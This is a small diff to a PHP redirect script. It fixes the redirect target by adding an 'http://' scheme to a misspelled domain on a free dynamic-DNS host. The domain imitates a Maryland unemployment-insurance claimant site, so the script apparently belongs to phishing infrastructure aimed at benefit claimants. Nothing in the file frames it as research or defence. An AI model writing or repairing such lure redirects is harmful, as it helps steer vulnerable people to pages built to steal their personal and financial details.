@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: merylanduiclaimnt.cloudns.ph"); 
+header("Location: http://merylanduiclaimnt.cloudns.ph/"); 
   
 exit; 
 ?> 
